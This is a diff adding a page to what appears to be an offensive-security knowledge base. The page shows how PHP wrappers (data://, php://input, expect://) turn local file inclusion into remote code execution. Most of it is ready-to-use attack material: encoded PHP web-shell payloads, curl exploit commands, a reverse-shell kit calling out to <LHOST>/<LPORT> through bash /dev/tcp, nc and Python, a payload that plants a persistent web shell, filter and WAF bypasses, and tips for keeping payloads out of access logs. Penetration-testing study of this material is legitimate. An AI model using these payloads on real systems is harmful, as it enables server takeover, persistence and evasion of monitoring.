@@ -1,0 +1,312 @@
+---
+title: Wrappers
+description: PHP wrappers that turn LFI into RCE - data://, php://input, expect:// for direct command execution through the inclusion sink.
+mitre: [T1190, T1059.004]
+d3fend: [D3-EAL, D3-PE]
+impact: [ServerSideEval, RCE]
+owasp: [A03]
+sidebar:
+  order: 5
+  label: Wrappers
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+When the LFI sink executes PHP, three wrappers turn the bug into RCE without needing a file uploaded or a remote URL hosted:
+
+```
+# data:// - embed base64-encoded PHP directly in the URL
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id
+
+# php://input - send PHP code as POST body
+curl -X POST --data '<?php system($_GET["cmd"]); ?>' \
+     "https://target/?page=php://input&cmd=id"
+
+# expect:// - when the expect extension is loaded
+?page=expect://id
+```
+
+Success indicator: output of the command (`uid=...` for `id`) in the response.
+
+## Prerequisites
+
+| Wrapper | Requires | Notes |
+| --- | --- | --- |
+| `data://` | `allow_url_include = On` | Most common - base64-encoded PHP in the URL |
+| `php://input` | `allow_url_include = On` | Reads POST body as PHP source |
+| `expect://` | `expect` extension loaded (rare) | Direct command execution, no wrapper-shell needed |
+
+`allow_url_include` is disabled by default. Check via [`php://filter`](/codex/web/lfi/php-filters/) before assuming these work:
+
+```bash
+curl -s "https://target/?page=php://filter/convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini" \
+    | grep -oE '[A-Za-z0-9+/=]{200,}' \
+    | base64 -d \
+    | grep -E '^(allow_url_include|extension=)'
+```
+
+If `allow_url_include = On` → `data://` and `php://input` work.
+If `extension=expect` → `expect://` works.
+
+## `data://` wrapper
+
+The cleanest RCE primitive. Embed the PHP code directly in the URL using the `data:` scheme.
+
+### Construction
+
+1. Write the PHP code:
+   ```php
+   <?php system($_GET["cmd"]); ?>
+   ```
+
+2. Base64-encode it:
+   ```bash
+   echo '<?php system($_GET["cmd"]); ?>' | base64
+   # → PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+   ```
+
+3. URL-encode the base64 (the `=` padding and `+` need encoding):
+   ```bash
+   echo 'PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==' \
+       | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))"
+   # → PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D
+   ```
+
+4. Build the full URL:
+   ```
+   ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+   ```
+
+The application reads `data://text/plain;base64,...`, base64-decodes to the PHP source, then executes it (because the sink is `include()`-like). The included code reads `$_GET["cmd"]` - which is `id` - and runs it.
+
+### Variations
+
+The `text/plain` MIME type is conventional but not required. The wrapper accepts any:
+
+```
+data://text/plain;base64,...                    # most common
+data://text/html;base64,...                     # works
+data://application/octet-stream;base64,...      # works
+```
+
+Plaintext payload (no base64) is also accepted:
+
+```
+data://text/plain,<?php system($_GET["cmd"]); ?>
+```
+
+URL-encoded for transport:
+
+```
+?page=data://text/plain,%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E&cmd=id
+```
+
+Base64 form is preferred because PHP brackets and operators don't survive the URL cleanly without encoding - base64 makes the payload portable across encoding contexts.
+
+### Working with appended extensions
+
+When the application appends `.php`:
+
+```php
+include($_GET['page'] . ".php");
+```
+
+The full path becomes `data://text/plain;base64,...&cmd=id.php`. PHP parses the `data://` URL and reads the base64 chunk up to the parameter delimiter - the trailing `.php` becomes part of the URL but doesn't break parsing. The wrapper works regardless of appended extensions.
+
+### Reverse shell payload
+
+A more useful PHP payload - a reverse shell:
+
+```bash
+# bash reverse shell payload
+PHP_PAYLOAD='<?php exec("bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\""); ?>'
+echo "$PHP_PAYLOAD" | base64
+# → PD9waHAgZXhlYygiYmFzaCAtYyBcImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvOTk5OSAwPiYxXCIiKTsgPz4K
+```
+
+Replace `<LHOST>/<LPORT>` with your listener, encode, submit. Catch on `nc -lvnp <LPORT>`.
+
+## `php://input` wrapper
+
+Reads the raw HTTP request body and treats it as the file contents. Same RCE outcome as `data://` but uses POST for the payload instead of GET:
+
+```bash
+curl -X POST \
+     --data '<?php system($_GET["cmd"]); ?>' \
+     "https://target/?page=php://input&cmd=id"
+```
+
+The application sees:
+- `page=php://input` (in URL)
+- POST body: `<?php system($_GET["cmd"]); ?>`
+- The wrapper substitutes the POST body for the file contents
+- PHP executes the body
+- `$_GET["cmd"]=id` triggers the `id` command
+
+### When to prefer `php://input` over `data://`
+
+- **WAF blocking `data://`** - some WAFs specifically block the `data:` scheme. `php://input` doesn't have the scheme on the URL.
+- **Large payloads** - `data://` requires the payload to fit in the URL (~2KB limit on most stacks). POST body has no such limit.
+- **Logging avoidance** - server access logs capture URLs but typically not POST bodies. `php://input` keeps the payload out of access logs.
+
+### When `php://input` doesn't work
+
+- **The parameter only accepts GET requests.** If the LFI sink is reached only via GET, `php://input` can't deliver the POST body to it.
+- **`allow_url_include = Off`.** Same restriction as `data://`.
+- **The application reads the body for its own purposes** before the include. The wrapper reads from `php://input` which is a stream - if the application consumed it already, the wrapper sees an empty body.
+
+The third case is subtle. PHP frameworks that parse the request body early (e.g., Laravel's middleware, Symfony's request handling) consume the input stream. By the time the include() runs, `php://input` is empty. This is rare in trivial LFI demos but common in real frameworks.
+
+## `expect://` wrapper
+
+The cleanest RCE if available. The `expect` extension provides direct command execution:
+
+```
+?page=expect://id
+```
+
+Output:
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+No PHP code involved - the wrapper invokes the shell directly. The output is the command's stdout (and stderr, depending on configuration).
+
+### Prerequisites
+
+The `expect` PHP extension must be installed and enabled. Check:
+
+```bash
+curl -s "https://target/?page=php://filter/convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini" \
+    | grep -oE '[A-Za-z0-9+/=]{200,}' \
+    | base64 -d \
+    | grep -i expect
+# → extension=expect    (if enabled)
+```
+
+The `expect` extension isn't part of standard PHP - it's a PECL package installed separately. Most production servers don't have it. The bug surface is narrow but devastating when present.
+
+### Caveats
+
+- Commands run as the web server user (`www-data`, `apache`, `nginx`).
+- Some commands hang or fail silently due to TTY expectations of `expect`. Simple commands like `id`, `whoami`, `uname -a` work cleanly. Anything interactive (`vim`, `python` interpreter) won't.
+- The `expect://` wrapper doesn't shell-escape - special characters in your command can break the parse:
+  ```
+  ?page=expect://ls -la /tmp        # works
+  ?page=expect://ls -la /tmp;id     # may execute as two commands or break
+  ```
+
+For complex commands, base64-encode and pipe through `bash`:
+
+```
+?page=expect://bash -c "echo aWQ= | base64 -d | bash"
+```
+
+Where `aWQ=` is base64 of `id`. Avoids escaping issues.
+
+## Wrapper-specific bypasses
+
+Some applications filter wrapper schemes. Common bypasses:
+
+### Case manipulation
+
+```
+?page=DATA://text/plain;base64,...
+?page=Data://text/plain;base64,...
+?page=pHp://input
+```
+
+Wrapper-scheme parsing is sometimes case-sensitive in the filter but case-insensitive in PHP's URL handler.
+
+### Filter ordering
+
+When the app filters wrappers but allows `php://filter`, chain through filter:
+
+```
+?page=php://filter/convert.base64-decode/resource=data://text/plain;base64,...
+```
+
+This is convoluted and rarely works, but worth knowing about for edge cases.
+
+### Alternate PHP wrappers
+
+The full set of PHP wrappers is larger than the three discussed. Less common but sometimes useful:
+
+```
+phar://             # PHAR archive - see [file-upload chain]
+zip://              # ZIP archive - see [file-upload chain]
+glob://             # filesystem glob - read-only enumeration
+ssh2://             # if ssh2 extension installed - connects to SSH
+ogg://              # OGG audio - read-only
+```
+
+Most of these are read-only and don't lead directly to RCE; they're file-access primitives that compose with other techniques.
+
+## Combining with path traversal
+
+When the application has both LFI *and* a path prefix:
+
+```php
+include("./pages/" . $_GET['page']);
+```
+
+The naive `?page=data://...` becomes `./pages/data://...` - PHP might not recognize the wrapper because of the prefix.
+
+Escape the prefix first:
+
+```
+?page=../../data://text/plain;base64,...
+```
+
+PHP resolves `../../` from the prefix, hits `data://`, recognizes the wrapper, processes the rest. Specific path depth and PHP version affect whether this works - try with various `../` counts.
+
+## Reverse-shell payload kit
+
+Reusable PHP payloads for the data wrapper. Base64-encoded, drop-in replacements for the `system($_GET[...])` skeleton:
+
+```bash
+# bash reverse shell
+echo '<?php exec("bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\""); ?>' | base64
+
+# nc reverse shell (when nc has -e)
+echo '<?php exec("nc <LHOST> <LPORT> -e /bin/bash"); ?>' | base64
+
+# python reverse shell (when bash unavailable)
+echo '<?php exec("python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect((\\\"<LHOST>\\\",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\""); ?>' | base64
+
+# File-writing payload (drop a permanent shell)
+echo '<?php file_put_contents("/var/www/html/x.php", "<?php system(\$_GET[\"c\"]); ?>"); ?>' | base64
+```
+
+The file-writing payload is particularly useful - drops a persistent shell at `/x.php` accessible at `?c=...` without needing to re-trigger the LFI for each command.
+
+## Detection-only payloads
+
+Confirm the wrapper works without committing to a full RCE:
+
+```bash
+# Minimal data:// payload that prints "wrapper works"
+echo '<?php echo "WRAPPER_WORKS"; ?>' | base64
+# Submit:
+?page=data://text/plain;base64,PD9waHAgZWNobyAiV1JBUFBFUl9XT1JLUyI7ID8+
+
+# php://input minimal probe
+curl -X POST --data '<?php echo "INPUT_WRAPPER_WORKS"; ?>' "https://target/?page=php://input"
+
+# expect:// minimal probe (output is the command's stdout)
+?page=expect://echo expect_works
+```
+
+The probe payloads avoid touching the filesystem or network - clean way to confirm capability before committing.
+
+## Notes
+
+- **`allow_url_include` is the key gate.** Without it, `data://` and `php://input` fail outright. Check the PHP config first via `php://filter` - answers in one request.
+- **`expect` is rare but devastating.** When present, it's the shortest path to RCE through LFI. Worth specifically checking for in any PHP config file you can read.
+- **WAFs catch some wrapper schemes more than others.** `data:` is in most WAF rulesets. `php://input` slips past more often because the URL doesn't look exotic - just a normal-looking `php://input` string. `expect://` is uncommon enough that few WAFs match it specifically.
+- **Once one wrapper works, the others usually do too.** They share the `allow_url_include` prerequisite. If `data://` fails but you haven't checked the config, `php://input` will likely fail for the same reason.
+
+<Aside type="caution">
+The `data://` payload reaches command execution in a single HTTP request - no setup, no file upload, no listener required for the proof. This means the moment you confirm one of these wrappers works, you have RCE. Demonstrate at the `id` / `whoami` level and stop until scope-confirmed for further work.
+</Aside>
